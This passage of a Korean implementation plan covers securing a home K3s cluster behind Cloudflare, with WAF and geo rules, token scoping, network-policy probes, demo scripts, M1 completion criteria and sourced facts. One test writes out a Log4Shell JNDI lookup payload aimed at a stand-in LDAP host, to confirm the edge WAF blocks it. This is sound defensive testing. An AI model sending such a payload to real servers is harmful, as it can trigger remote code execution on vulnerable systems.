  - **관리형 규칙 (미검증 기대):** `assert_fails_with "free managed ruleset blocks log4shell probe" --rc 22 --match '^EDGE_CLASS=BLOCKED$' -- edge_fetch https://$HOST_SAFEDESK/ -H 'User-Agent: ${jndi:ldap://x.invalid/a}'` — Free Managed Ruleset에 이 시그니처가 있는지는 **미검증**. 통과하지 않으면 이 항목을 "대시보드 증거 전용"으로 바꾸고 결과를 숨기지 않고 기록한다.
  - **캐시 우회 (Q15):** 증명은 위 "설정 사실"의 cache 규칙(세 호스트 bypass)이다. 응답 헤더 `cf-cache-status`는 **정보용**으로 기록만 한다 (`BYPASS` 기대. `DYNAMIC`은 규칙 없이도 나올 수 있어 규칙의 증거가 아님)
  - **CSP 무결성 (Q11):** 에지 응답의 CSP 헤더 = 원본 CSP 문자열(정확히 같음), 응답 본문에 `/cdn-cgi/challenge-platform/` 주입 여부를 기록 (Bot Fight Mode JS Detections)
  - **apex/www 불변:** `m1-dns-baseline.sh` 호출 (DNS 불변, `cf-ray` 없음)
  - **국가 차단(R1):** KR에서는 행동 검증 불가 → 증거 파일 존재 확인: `docs/evidence/m1/cloudflare-edge/geo-rule.png`, `geo-probe-<날짜>.txt`(Step 7), `geo-security-events.png`
- [ ] **Step 3: 실행 → FAIL 확인** (규칙 없음, 내보내기 토큰 없음).
- [ ] **Step 4 (MANUAL, 사용자): 읽기 전용 내보내기 토큰 (결정 N2a)** — 런북에 Custom Token 생성 절차: 권한은 모두 Read(Zone Settings, Zone WAF/Firewall Services, Bot Management, DNS, Cache Rules — 정확한 권한 이름은 실행 시 대시보드에서 확인) + **Zone · Zone · Read**(zone ID 조회 — 기술적 필요 → 사용자 승인 2026-11-20), Zone Resources는 `whoareryu.cloud` 하나, **Client IP 필터 = 집 공인 IPv4**, **만료 6개월**(DNS-01 토큰과 같은 교체 절차). 값은 바로 키체인 `secure-ax-cf-readonly`에 저장 (`security add-generic-password -s secure-ax-cf-readonly -a cf-export -w`). 토큰 요약 화면을 `docs/evidence/m1/cf-token-readonly.png`로 캡처(IP 가림). `m1-edge.sh`는 `/user/tokens/verify`로 이 토큰의 `status: active`와 `expires_on` 186일 이내를 확인하고, 쓰기 불가를 `assert_fails_with "readonly token cannot write" --rc 1 --match '"code":[[:space:]]*(9109|10000)' -- cf_api_ro PATCH "/zones/$ZONE_ID/settings/ssl" '{"value":"strict"}'`로 확인한다.
- [ ] **Step 5 (MANUAL, 사용자): 대시보드 적용** — 런북 `m1-cloudflare-edge.md`에 위 표를 순서대로 클릭 경로와 함께 적고, 각 화면을 `docs/evidence/m1/cloudflare-edge/`에 캡처 (Global Constraints "증거 위생"의 캡처 규칙대로 계정 이메일·이름·ID 가림). 유료 업그레이드를 권하는 옵션은 켜지 않는다 (CG-CF3).
- [ ] **Step 6:** `export-config.sh` 실행 → `check-export-clean.sh` rc 0 확인 → 결과를 눈으로 한 번 검토한 뒤 `config-export.json`으로 저장(커밋 대상) → `m1-edge.sh` PASS. `BOT_CHALLENGED`로 판정 불가 항목이 나오면 그 사실과 cf-ray를 증거에 기록하고, PASS로 바꾸지 않는다.
- [ ] **Step 7 (MANUAL, 사용자): 국가 차단 외부 관측 (Q8 A+B)**
  1. GitHub Actions에서 `edge-geo-probe` 워크플로를 수동 실행 (VM이 켜져 있을 때). 결과 Job Summary를 `docs/evidence/m1/cloudflare-edge/geo-probe-<날짜>.txt`로 저장 (`scrub_evidence` 후).
  2. 판정: 러너 `loc`가 KR이 아니고 `SERVED=0`이어야 한다 (외국에서 앱 응답을 받지 못함). `GEO_BLOCKED` 수와 `BOT_CHALLENGED` 수는 따로 적는다. `GEO_BLOCKED`로 나온 cf-ray를 Security Events에서 찾아 `sax-geo-kr-only` 매치 화면을 `geo-security-events.png`로 캡처 (A, 캡처 규칙대로 가림).
  3. 모두 `BOT_CHALLENGED`라 국가 규칙의 행동이 드러나지 않으면 그렇게 적고, 대시보드 증거(규칙 화면 + Security Events)를 기준으로 삼는다.
- [ ] **Step 8 (MANUAL, Q11 A): CSP 영향 기록** — 브라우저로 세 호스트를 열어 개발자 도구 콘솔의 CSP 위반(예: `/cdn-cgi/challenge-platform/` 스크립트 차단)과 페이지 동작을 `docs/evidence/m1/csp-js-detections.md`에 기록. CSP는 바꾸지 않는다. nonce 도입은 M3에서 재검토한다고 적는다.
- [ ] **Step 9 (MANUAL, 사용자): 비용 재확인** — Billing 구독 0개, Free 플랜, 결제수단 상태 캡처 (CG-CF2, CG-CF4, 캡처 규칙대로 가림). GitHub Actions 사용량이 공개 저장소 무료 범위인지 캡처 (CG10).
- [ ] **Step 10: 커밋** `feat(edge): cloudflare free WAF, bot, rate-limit, geo and cache controls with export and probes`

---

### Task 11: `attacks/netmatrix.sh` 뼈대

**Files:**
- Create: `attacks/lib/netmatrix.sh`, `attacks/netmatrix.sh`, `attacks/netmatrix.expected.tsv`, `attacks/probe-pod.yaml.tmpl`, `tests/scripts/test_netmatrix_compare.sh`, `tests/scripts/fixtures/netmatrix-{expected,actual-ok,actual-bad}.tsv`

**Interfaces:** 기존 계획 Task 10과 같다.
- 기대 매트릭스 TSV 열: `rule_id  src_ns  src_app  dst_host  port  proto  expect` (`expect` ∈ `allow|deny`, `proto` ∈ `tcp|udp`, `#` 주석 허용). 실측 TSV 열: `rule_id  result`.
- `compare_matrix <expected.tsv> <actual.tsv>` — 표를 stdout으로, 불일치 건수를 종료 코드로. 실측에 없는 `rule_id`는 `MISSING`으로 센다.
- `attacks/netmatrix.sh [--keep-pods]` — 출발지 앱과 같은 라벨의 프로브 Pod(PSA restricted, arm64 busybox 계열, digest 고정)로 각 행을 `nc -z -w 2` 또는 `nslookup`으로 시험, 결과를 `docs/evidence/m1/netmatrix-<날짜>.txt`에 저장, 끝나면 프로브 Pod 삭제.

- [ ] **Step 1~4:** 기존 계획 Task 10 Step 1~4와 같다 (비교기 단위 테스트 → FAIL → 구현 → PASS).
- [ ] **Step 5:** `attacks/netmatrix.expected.tsv` M1 행:

  | rule_id | 내용 | expect |
  |---|---|---|
  | N1-<ns> ×5 | 각 ns 프로브 → `kube-dns.kube-system.svc.cluster.local` 53/udp | allow |
  | N2, N3, N4 | traefik → `safedesk-app:8000`, `minishop-app:8000`, `relay-reveal:8001` | allow |
  | M1-X1 | safedesk-app → `minishop-app.minishop.svc:8000` | deny |
  | M1-X2 | minishop-app → `relay-reveal.pii-relay.svc:8001` | deny |
  | M1-X3 | safedesk-app → `1.1.1.1:443` | deny (외부 egress) |
  | M1-X4 | safedesk-app → `<NODE_IP>:6443` | deny |
  | M1-X5 | safedesk-app → `<NODE_IP>:10250` | deny |
  | M1-X6 | `openbao` 프로브 → `1.1.1.1:443` | deny |
  | M1-X7 | `audit-anchor` 프로브 → `1.1.1.1:443` | deny (N20은 M4, 대상은 Q18에 따라 M4에서 결정) |
  | M1-X8 | traefik → `relay-reveal.pii-relay.svc:8002` | deny |
  | M1-X9 | safedesk-app → `<NODE_IP>:20241` (cloudflared metrics) | deny |
  | M1-X10 | safedesk-app → `api.cloudflare.com` 해석 IP:443 | deny (DNS-01 토큰 경로는 cert-manager ns 전용) |
  | M1-X11 | safedesk-app → `region1.v2.argotunnel.com` 해석 IP:7844 | deny (터널 이그레스는 호스트 전용) |

  N5 행은 넣지 않는다. 기대 파일 머리 주석에 "N5: DNS-01 전환으로 폐지"를 적는다. `<NODE_IP>`와 해석 IP는 실행 시 치환한다.
- [ ] **Step 6:** `bash attacks/netmatrix.sh` → 전부 `OK`, 종료 코드 0. 처음부터 통과하면 `safedesk`의 `default-deny`를 잠시 지우고 M1-X1/X3/X10이 `MISMATCH`로 잡히는지 확인 후 복구 → `docs/evidence/m1/netmatrix-negative-control.txt`.
- [ ] **Step 7:** `Makefile`에 `netmatrix: ; bash attacks/netmatrix.sh`.
- [ ] **Step 8: 커밋** `feat(attacks): netmatrix probe and comparator with M1 expectations`

---

### Task 12: M1 통합 검증, 시연 켜기·끄기, VM 생명주기 내구성, 증거

**Files:**
- Modify: `Makefile` (`verify-m1`, `demo-up`, `demo-down`, `lan-scan`), `k8s/VERSIONS.md`, `docs/cost/README.md`, `docs/2026-11-11-secure-ax-k3s-design.md`(§15.1 실측값, 부록 A 확인 항목, §20 M1 완료 기준을 아래 C1~C19와 맞춤)
- Create: `scripts/demo/demo-up.sh`, `scripts/demo/demo-down.sh`, `scripts/demo/lib/clock.sh`, `tests/scripts/test_clock_drift.sh`, `scripts/verify/m1-demo.sh`, `README.md`, `docs/evidence/m1/README.md`, `docs/cost/2026-11-m1-*.png`

**Interfaces:**
- Consumes: Task 2~11 검증 스크립트 전부, `edge_fetch`, `m1-lan-scan.sh`
- Produces:
  - `make verify-m1` — Mac에서 실행, 순서대로 돌리고 하나라도 실패하면 exit 1:
    `m1-lima.sh` → `m1-exposure.sh --stage tunnel` → `m1-host.sh`(vm) → `m1-hardening.sh`(vm --root) → `m1-k3s.sh` → `m1-dns-baseline.sh` → `m1-certmanager.sh` → `m1-traefik.sh` → `m1-psa.sh` → `m1-origin.sh --issuer prod`(vm) → `m1-tunnel.sh` → `m1-edge.sh` → `netmatrix`
  - `scripts/demo/lib/clock.sh`: `clock_drift_ok <mac_epoch> <vm_epoch> <max_sec>` — 차이의 절댓값이 `max_sec` 이하면 0, 아니면 차이를 출력하고 1 (순수 함수).
  - `make demo-up` (`demo-up.sh`, Mac, 멱등): `limactl start $LIMA_INSTANCE` → `caffeinate -dims`를 백그라운드로 띄우고(`-d` 화면, `-i` 유휴 잠자기, `-m` 디스크, `-s` 시스템 잠자기 방지. `-s`는 **전원 어댑터 연결 시에만** 효과가 있으므로 시연 중에는 전원을 연결한다고 런북에 적는다. `-u`는 쓰지 않는다 — `-t` 없이 쓰면 5초 뒤 풀리는 단언이라서) PID를 `${XDG_STATE_HOME:-$HOME/.local/state}/secure-ax/caffeinate.pid`에 기록(이미 살아 있으면 재사용) → **시계 차이 확인**: VM `timedatectl show -p NTPSynchronized --value` = `yes`이고 Mac·VM `date -u +%s` 차이 2초 이하(`clock_drift_ok`). 아니면 VM에서 `systemctl restart systemd-timesyncd` 후 최대 60초 재확인, 그래도 실패면 exit 1 → cloudflared `/ready` 200 대기 → 세 호스트 `edge_fetch` `EDGE_CLASS=OK`.
  - `make demo-down` (`demo-down.sh`, Mac, 멱등): PID 파일의 `caffeinate`를 종료하고 파일 삭제 → `limactl stop $LIMA_INSTANCE`. 평소 상태(공개 호스트는 Cloudflare 기본 오류 페이지)로 돌아간다.
  - `make lan-scan` — Docker 컨테이너(nmap 이미지, digest 고정)로 Mac LAN IP 전체 TCP 스캔(`nmap -n -Pn -p- -T4 -oG`), `-oG` 결과를 지정 파일로 저장 — **대체 수단 전용**. 결과 머리에 `scanner: docker`와 한계 문장을 자동으로 넣는다. 기본 증거는 다른 실제 기기에서 같은 nmap 인자로 찍으며, 그 절차(다른 노트북, Termux nmap 휴대폰)를 런북에 적는다.
  - `README.md` (Q21, 결정 N4) — 최소 내용만: 한 줄 소개, "기존 개인 도메인 사용, 프로젝트 추가 비용 0원", "시연은 요청 시 Mac을 켜서 공개합니다. 평소에는 Cloudflare 기본 오류 페이지가 나오며, 영상·캡처를 참고해 주세요."(이 문장 그대로), 문서 링크(기획서, ADR 목록, 이 계획, `docs/evidence/m1/README.md`, `docs/cost/README.md`). 비밀값·IP·계정 정보 없음.

- [ ] **Step 1: 실패하는 테스트 작성** `test_clock_drift.sh`: `(100, 101, 2)` → 0, `(100, 98, 2)` → 0, `(100, 103, 2)` → `assert_fails_with "drift over limit" --rc 1 --match '^drift 3s'`, 음수 차이도 같은 방식. FAIL → `clock_drift_ok` 구현 → PASS.
- [ ] **Step 2: 실패하는 검증 작성** `m1-demo.sh` (Mac):
  - `demo-up` 뒤: PID 파일이 있고 `kill -0 <pid>` 성공, `pmset -g assertions` 출력에 그 PID의 `caffeinate` 단언 존재, 시계 차이 2초 이하, 세 호스트 `EDGE_CLASS=OK`
  - `demo-up` 두 번째 실행 뒤에도 `caffeinate` 프로세스가 하나뿐 (멱등)
  - `demo-down` 뒤:
    - `assert_fails_with "caffeinate released" --rc 1 --match 'No such process' -- kill -0 <이전 pid>`
    - `pmset -g assertions > $tmp/pm` 성공 assert → `assert_fails_with "no caffeinate sleep assertion" --rc 1 -- grep -Fq 'caffeinate' "$tmp/pm"`
    - `limactl list --json $LIMA_INSTANCE`의 `status` = `Stopped`
    - 공개 호스트가 꺼짐: `assert_fails_with "public host offline after demo-down" --rc 22 --match '^EDGE_STATUS=530$' -- edge_fetch https://$HOST_SAFEDESK/` (Cloudflare 1033 오류 페이지의 HTTP 상태. 실제 값을 실행 시 확인해 고정하고 캡처를 남김)
- [ ] **Step 3:** 실행 → FAIL 확인 → `demo-up.sh`, `demo-down.sh`, `Makefile` 타깃 구현 → `make demo-up` → `m1-demo.sh`의 up 항목 PASS.
- [ ] **Step 4:** `verify-m1` 작성·실행 → 전부 PASS. 출력 전체를 `docs/evidence/m1/verify-<날짜>.txt`에 저장하고 `scrub_evidence`로 Mac 호스트 이름, `/Users/<name>` 경로·사용자 이름, MAC 주소, Mac LAN IP, guest IP, 방문자·집 IP, 터널 UUID, 계정·zone ID를 자리표시자로 치환한 뒤 `check-evidence-clean.sh` rc 0을 확인하고 커밋 (pre-commit의 `check-evidence-clean`·`check-cluster-values`·gitleaks 훅이 한 번 더 막는다).
- [ ] **Step 5 (MANUAL, 사용자): LAN 스캔 전체 스택 (S1 대체)** — Task 3 Step 8의 1·2·5·6(대조 리스너 18090, 필요할 때만 방화벽 임시 허용과 제거, 머리 줄과 `scrub_evidence`)을 똑같이 한다. VM이 켜진 상태(터널·Traefik 동작)에서 같은 LAN의 다른 실제 기기(기본. 대체 수단은 `make lan-scan` — 한계 문장 필수)로 `lan-scan-tunnel-vm-on.gnmap`, `make demo-down` 뒤 `lan-scan-tunnel-vm-off.gnmap` → `m1-lan-scan.sh` PASS (VM이 Mac LAN IP의 열린 포트를 하나도 늘리지 않음, 6443·443·80·10250·20241·Lima SSH 포트 닫힘). LAN IP는 `<LAN_IP>`로 치환.
- [ ] **Step 6 (Review Focus 7, MANUAL):** `make demo-down` → `m1-demo.sh`의 down 항목 PASS, 공개 호스트의 Cloudflare 오류 페이지 캡처("평소에는 Cloudflare 기본 오류 페이지"의 증거) → `make demo-up` → 5분 안에 `make verify-m1` PASS. 실패하면 원인(서비스 enable 누락 등)을 고치고 처음부터.
- [ ] **Step 7 (Review Focus 7, MANUAL):** `make demo-up` 상태에서 덮개를 닫지 않고 10분 둔 뒤 시스템 잠자기가 일어나지 않았는지(`pmset -g log`) 기록. 이어서 `make demo-down` 후 Mac을 10분 이상 잠자기 → 깨운 뒤 `make demo-up`이 시계 차이 확인을 통과하고 `make verify-m1` PASS. 시계가 돌아오지 않으면 `chrony` 전환 또는 timesyncd 재시작 훅을 `bootstrap.sh`에 추가하고 Task 3 검증에 항목을 더한다.
- [ ] **Step 8:** 로그 보존 확인 (Q12, 결정 N3): VM 재시작 뒤에도 `logrotate.timer`와 drop-in이 활성이고 `m1-traefik.sh`의 보존 항목(가짜 9일 전 파일 삭제 시연 포함)이 PASS. 결과를 `docs/evidence/m1/log-retention.md`에 기록.
- [ ] **Step 9:** 비용 점검: Cloudflare Billing·구독·플랜 캡처(CG-CF4), GitHub 사용량 캡처(CG10). OCI 캡처는 "해당 없음(TARGET=local)"으로 기록.
- [ ] **Step 10 (Q21, 결정 N4):** `README.md` 작성(위 Interfaces의 내용만). 확인: `grep -Fq '기존 개인 도메인 사용, 프로젝트 추가 비용 0원' README.md`, `grep -Fqx '시연은 요청 시 Mac을 켜서 공개합니다. 평소에는 Cloudflare 기본 오류 페이지가 나오며, 영상·캡처를 참고해 주세요.' README.md` 성공, 링크 대상 파일이 모두 존재, `gitleaks detect --no-banner` rc 0. `docs/cost/README.md`의 문구와 같게 맞춘다.
- [ ] **Step 11:** 기획서 갱신: §15.1 "OS + K3s"·Traefik·cert-manager 실측값, 부록 A의 M1 확인 항목(아래 "관련 문서"의 실측 대상)을 확인됨/결과로 변경, §20 M1 완료 기준을 C1~C19와 맞추고 완료일 기록. §20 M3/M6의 공개 모드 게이트(Q16)가 있는지 확인만 한다.
- [ ] **Step 12:** `docs/evidence/m1/README.md`에 완료 기준별 증거 링크 표 (아래 C1~C19와 1:1).
- [ ] **Step 13: 커밋** `feat(demo): demo-up/down with caffeinate and clock check; docs: M1 evidence, README, lifecycle checks`

---

## M1 완료 기준 (기획서 §20 M1 행 대체안)

| # | 기준 | 증명 |
|---|---|---|
| C1 | 세 호스트 `https://<host>/`가 공개 경로(Cloudflare 에지 → 터널 → Traefik)로 200, 본문에 합성 데이터 경고 | `m1-tunnel.sh` |
| C2 | `http://<host>/` → 301 `https://` (에지), 원본도 80 → 301 | `m1-edge.sh`, `m1-origin.sh` |
| C3 | 원본 인증서는 Let's Encrypt prod(DNS-01), cloudflared가 호스트별 `originServerName`으로 검증, `noTLSVerify` 없음 | `m1-origin.sh --issuer prod`, `audit_tunnel_config` |
| C4 | **인바운드 노출 0 (호스트 방화벽 없이, Q13):** Lima `networks` 0개·`mounts` 0개(상속 포함)·처음 두 포워드 규칙(6443 + catch-all ignore), Mac의 Lima 리스너는 `127.0.0.1:6443`과 Lima SSH 포트뿐, 루프백 외 바인드·UDP 소켓 없음, guest 임의 포트·Traefik 80/443은 Mac에 포워드되지 않음, Mac에서 guest IP 직접 연결 불가(양성 대조 포함), Mac LAN IP:6443/443 연결 실패, **같은 LAN의 다른 실제 기기(대체: Docker, 한계 표기)의 Mac LAN IP nmap 스캔에서 VM 켜짐·꺼짐의 열린 포트가 같고 6443·443·80·10250·20241·Lima SSH 포트가 닫힘**(S1 대체) | `m1-lima.sh`, `m1-exposure.sh`, `m1-k3s.sh`, `m1-lan-scan.sh` + `lan-scan-*.gnmap` |
| C5 | **6443은 터널로 닿지 않음:** 터널 ingress 감사(서비스 4개, 6443 없음), `ingress rule` catch-all 404, 공개 호스트 `/version`에 K8s 응답 없음, `:6443` 접속 실패, 임의 서브도메인 해석 실패 | `m1-tunnel.sh` |
| C6 | kube API는 Mac `127.0.0.1:6443`에서만, 익명 거부 | `m1-k3s.sh` |
| C7 | 5개 ns가 PSA 위반 매니페스트를 거부, default-deny + N1만 존재 (N5 없음) | `m1-psa.sh` |
| C8 | netmatrix에서 허용 외 전부 차단 (M1-X9~X11 포함) | `netmatrix` |
| C9 | 에지 통제 동작: TLS1.1 거부, `/signup` 차단, relay `/console` Managed Challenge, 민감 경로 5회/10초 초과 시 429, 비허용 메서드 차단, 캐시 우회, CSP 무변형 | `m1-edge.sh` |
| C10 | **KR 외 국가 차단:** 규칙 설정(내보내기 + 캡처), GitHub Actions 외국 러너 프로브에서 `SERVED=0`(GEO_BLOCKED·BOT_CHALLENGED 수 따로 표시), Security Events의 `sax-geo-kr-only` 매치 | `m1-edge.sh`(설정), `geo-probe-<날짜>.txt`, 캡처 |
| C11 | Bot Fight Mode, Free Managed Ruleset 켬, JS Detections와 CSP 충돌 영향 기록. Cloudflare 설정이 커밋된 정규화 기준선(`config-export.json`, 식별자·비밀 없음)과 같음 (결정 N2b) | 내보내기·드리프트 검사, `check-export-clean.sh`, 캡처, `csp-js-detections.md` (+ Log4Shell 프로브 결과, 미검증 항목) |
| C12 | apex/www DNS·응답 불변, DNS-only(`cf-ray` 없음) | `m1-dns-baseline.sh`, 캡처 |
| C13 | 비용 0원: Cloudflare 구독 0개·Free 플랜·결제수단 상태, 금지 기능 미사용, GitHub 무료 범위, "기존 개인 도메인 사용, 프로젝트 추가 비용 0원"과 시연 정책을 담은 `README.md` (결정 N4) | `docs/cost/` 캡처, `README.md` |
| C14 | 비밀 미커밋: gitleaks 전체 스캔 0건, DNS-01 토큰은 키체인 + Secret, 읽기 전용 토큰은 키체인만, 터널 자격 증명은 VM에만(Mac 사본·백업 없음), `cert.pem`은 Mac(cloudflared 기본 위치 전부)·VM(루트로 탐색) 어디에도 없음. 커밋된 텍스트 증거는 `check-evidence-clean` 통과(호스트 이름·사용자 경로·MAC·IP 없음), 대시보드 캡처는 가림 규칙 준수 | `m1-certmanager.sh`, `m1-tunnel.sh` |
| C15 | Cloudflare 토큰 2개(DNS-01, 읽기 전용): 단일 zone, 권한은 각자 지정한 것 + Zone·Zone·Read뿐(기술적 필요 → 사용자 승인 2026-11-20, 캡처), 허용 외 변경 불가, 만료 6개월 이내, 집 IPv4 필터(캡처). API 호출은 IPv4만(`curl -4`), VM에 전역 IPv6 없음, 클러스터 IPv4 단일 스택 (결정 N1, N2a) | `m1-certmanager.sh`, `m1-edge.sh`, `cf-token-*.png` |
| C16 | 요청 본문 64 KiB 초과는 원본과 공개 경로 모두 413 | `m1-origin.sh`, `m1-edge.sh` |
| C17 | 접근 로그에 쿼리스트링·`Cookie`·`Authorization` 없음, 방문자 IP는 hostPath 파일에만 기록되고(stdout 없음) logrotate(`ifempty`, `maxage 7`)가 7일 넘은 회전 파일을 실제로 지움(개수 규칙이 아닌 `maxage`로 지워짐을 표식으로 시연, 안전망 포함, 결정 N3) | `m1-traefik.sh`, `log-retention.md` |
| C18 | VM stop/start, Mac 잠자기 후 `make verify-m1` 재통과, 시계 동기화 | Task 12 증거 |
| C19 | `make demo-up`이 VM 시작·`caffeinate`·시계 차이 2초 이하 확인 후 세 호스트 200, `make demo-down`이 `caffeinate`를 해제하고 VM을 멈춰 공개 호스트가 Cloudflare 기본 오류 페이지로 돌아감 | `m1-demo.sh`, 캡처 |

## Self-Review 결과

- **Spec 대조:** §20 M1 항목 → Task

  | M1 항목 | Task |
  |---|---|
  | VM | 2 |
  | Tailscale | 미사용 (Q1), 관리 경로는 4 |
  | 방화벽(80/443만 개방) | 로컬에서는 호스트 방화벽 없음(Q13), 인바운드 0 증명은 2·3 |
  | K3s, secrets-encryption | 4 |
  | DuckDNS 3개 | → Cloudflare DNS(터널 CNAME) 5, 9 |
  | cert-manager | 5 (DNS-01) |
  | Traefik HelmChartConfig, `externalTrafficPolicy: Local` | 6 |
  | 5개 ns, PSA, default-deny, N1, ~~N5~~ | 7 (N5 폐지) |
  | 기본 미들웨어, 더미 HTTPS | 8, 9 (+ `body-limit`, Q19) |
  | netmatrix 뼈대 | 11 |
  | kubelet 프로브 확인 | 7 Step 5 |
  | 공개 노출 통제 (D6) | 10 |
- **결정 반영 확인:** Q1~Q23 모두 "확정된 결정" 표의 반영 위치에 들어갔다. 구현 방법이 갈리던 부분(결정 N1~N4)과 S1 대체·시연·콘솔·입력 길이 결정도 표에 넣고 각 Task에 반영했다. `console-ipallow`는 쓰지 않는다.
- **범위 밖:** §17.1의 앱 수준 공개 모드 통제(시드 Job, 데모 계정 발급, 1시간 물리 삭제 초기화 — Q17, 배너, 입력 길이 제한)는 실제 앱이 생기는 M3 이후다. 공개 링크는 M1부터 살아 있으므로 실제 앱 연결 게이트를 M3/M6 완료 기준에 넣는다 (Q16, 기획서 v5 §20에 반영됨 — Task 12 Step 11에서 확인). OpenBao(M2), CI(M0/M8), audit-anchor 외부 대상(M4, Q18), 호스트 방화벽(OCI 이전 시, Q13).
- **정직한 한계:** 로컬에는 심층 방어용 호스트 방화벽이 없어 인바운드 차단이 Lima 설정 두 가지에만 달려 있다 (매 검증마다 확인). DNS-01 토큰의 IP 필터는 외부 IP에서 시험하지 않고 캡처로만 증명한다. 국가 차단은 IP 지리 정보 기반이라 VPN으로 우회할 수 있다. LAN 스캔의 기본 증거는 다른 실제 기기에서 찍는다. 대체 수단인 Docker 컨테이너 스캔은 Docker Desktop VM 네트워크를 거쳤을 수 있어 같은 증명이 아니며, 쓰면 그 한계를 증거에 적는다.

---

## 근거 (2026-11-20 조회)

| 사실 | 상태 | 출처 |
|---|---|---|
| Rate limiting 규칙: Free는 **1개**, 기준 IP, 기간 10초, 완화 시간 10초 | 확인됨 | https://developers.cloudflare.com/waf/rate-limiting-rules/ |
| Rate limiting 동작: Free도 block / managed_challenge 등 선택 가능, 챌린지 동작은 기간 선택 불가 | 확인됨 | https://developers.cloudflare.com/waf/rate-limiting-rules/parameters/ |
| WAF custom rules: Free **5개**, Log 외 모든 동작(Block, Managed Challenge 포함), Regex 미지원 | 확인됨 | https://developers.cloudflare.com/waf/custom-rules/ |
| `ip.src.country` 필드 존재(ISO 2자리). Free 플랜에서 사용 가능 여부는 필드 문서에 명시 없음 | **부분 확인** — 대시보드에서 규칙 저장 시 확인 | https://developers.cloudflare.com/ruleset-engine/rules-language/fields/reference/ip.src.country/ |
| Free에서 쓸 수 있는 관리형 규칙은 **Cloudflare Free Managed Ruleset**뿐 | 확인됨 | https://developers.cloudflare.com/waf/managed-rules/ |
| Free Managed Ruleset이 Log4Shell 류 프로브를 막는지 | **미검증** | Task 10에서 실측 |
| Bot Fight Mode: 모든 Free 고객 사용 가능, 도메인 전체 토글, WAF Skip/Allow로 예외 불가, API·자동화 트래픽에 챌린지 가능, JS Detections 자동 켜짐(CSP 사용 시 `/cdn-cgi/challenge-platform/` 허용과 nonce 권장) | 확인됨 | https://developers.cloudflare.com/bots/get-started/bot-fight-mode/ , https://developers.cloudflare.com/bots/plans/free |
| Universal SSL: 루트와 **1단계 서브도메인만**, 더 깊은 단계는 Advanced Certificate Manager(유료) 필요, 프록시된 레코드에만 인증서 제공 | 확인됨 | https://developers.cloudflare.com/ssl/edge-certificates/universal-ssl/limitations/ |
| Cloudflare가 프록시하는 HTTPS 포트: 443, 2053, 2083, 2087, 2096, 8443. 6443은 아님. 에지 IP가 비표준 포트를 열린 것처럼 보일 수 있음 | 확인됨 | https://developers.cloudflare.com/fundamentals/reference/network-ports/ |
| cloudflared 이그레스: **7844 TCP(http2)/UDP(quic)** 필수(`region1/region2.v2.argotunnel.com`), 443은 업데이트·API 등 선택 | 확인됨 | https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/configure-tunnels/tunnel-with-firewall/ |
| `protocol` 기본 `auto` = QUIC, UDP 실패 시 http2로 폴백 | 확인됨 | https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/configure-tunnels/cloudflared-parameters/run-parameters/ |
| originRequest: TLS 검증 기본 켜짐(`noTLSVerify: false`), `originServerName` 비우면 서비스 URL 호스트로 검증, 사설 CA는 `caPool` | 확인됨 | https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/configure-tunnels/cloudflared-parameters/origin-parameters/ |
| Tunnel이 2026-02-20부터 기본 대시보드 Networking → Tunnels에서도 관리 가능 (Q3 A로 쓰지 않음) | 확인됨 | https://developers.cloudflare.com/changelog/2026-02-20-tunnel-core-dashboard |
| Zero Trust 온보딩은 Free 플랜이라도 결제 정보 입력 단계가 있음 (Q3 A CLI 경로로 회피) | **부분 확인** (preview 문서 기반) | https://developers.cloudflare.com/cloudflare-one/setup/ , https://developers.cloudflare.com/billing/create-billing-profile/ |
| cert-manager Cloudflare DNS-01: 토큰 권한 **Zone·DNS·Edit + Zone·Zone·Read**, Secret 키 `api-token`, `apiTokenSecretRef` | 확인됨 (문서 예시는 All Zones, 단일 zone 제한 동작은 Task 5에서 실측) | https://cert-manager.io/docs/configuration/acme/dns01/cloudflare/ |
| ClusterIssuer가 참조하는 Secret은 Cluster Resource Namespace(기본 `cert-manager`)에서 찾음 | 확인됨 | https://cert-manager.io/docs/configuration/ |
| API 토큰의 Client IP Address Filtering, TTL(만료) 설정과 `/user/tokens/verify` 응답의 `expires_on` | **미조회** — Task 5에서 대시보드·실제 응답으로 확인 | https://developers.cloudflare.com/fundamentals/api/get-started/create-token/ |
| Traefik `buffering` 미들웨어 `maxRequestBodyBytes` 초과 시 413 | **미조회** — Task 8에서 실측 | https://doc.traefik.io/traefik/middlewares/http/buffering/ |
| `https://www.cloudflare.com/cdn-cgi/trace`의 `loc=`로 요청자 국가 확인, GitHub 호스티드 러너의 위치는 보장되지 않음 | **미조회** (일반 동작) — 프로브가 `loc`를 기록하고 KR이면 판정 불가 처리 | — |
| Lima `template:ubuntu-24.04` 존재 (Lima 1.x의 `template://` 표기는 구식) | 확인됨 | https://lima-vm.io/docs/templates/ |
| Lima 자동 포트 포워드: guest localhost 포트를 host로 자동 포워드, 기본 `hostIP` `127.0.0.1`, 마지막에 1-65535 127.0.0.1→127.0.0.1 규칙 자동 추가, `ignore: true`로 제외, SSH 포워드는 변경 불가, Lima 2.0부터 `guestIP: 0.0.0.0`의 `guestIPMustBeZero` 기본값 true → catch-all ignore에는 `guestIPMustBeZero: false` 필요 | 확인됨 | https://lima-vm.io/docs/config/port/ , https://raw.githubusercontent.com/lima-vm/lima/master/templates/default.yaml |
| Lima 게스트 에이전트가 K8s NodePort/LoadBalancer 서비스도 포워드 대상으로 감지 | **부분 확인** (2차 자료) — Task 3·4에서 실측 | https://deepwiki.com/lima-vm/lima/8.3-port-discovery-and-monitoring |
| Lima 기본 템플릿은 홈 디렉터리를 읽기 전용 마운트, builtin 기본은 마운트 없음; vz는 macOS 13.5+ 기본 | 확인됨 | Lima default.yaml (위 URL) |
| Lima 기본(user-mode) 네트워크에서 Mac·LAN이 VM 주소로 직접 접근 불가, `networks`(vzNAT/shared/bridged)를 추가하면 직접 접근 가능 | **미검증** (일반적 동작) — Task 3의 guest IP 음성 검사(양성 대조 포함)로 실측 | https://lima-vm.io/docs/config/network/ |
| ServiceLB(LoadBalancer)를 VM 호스트 프로세스(cloudflared)가 `NODE_IP:443`으로 접근 가능 | **미검증** — Task 9에서 실측, 안 되면 Traefik ClusterIP로 대체 | — |

---

## 관련 문서 (2026-11-20 현재)

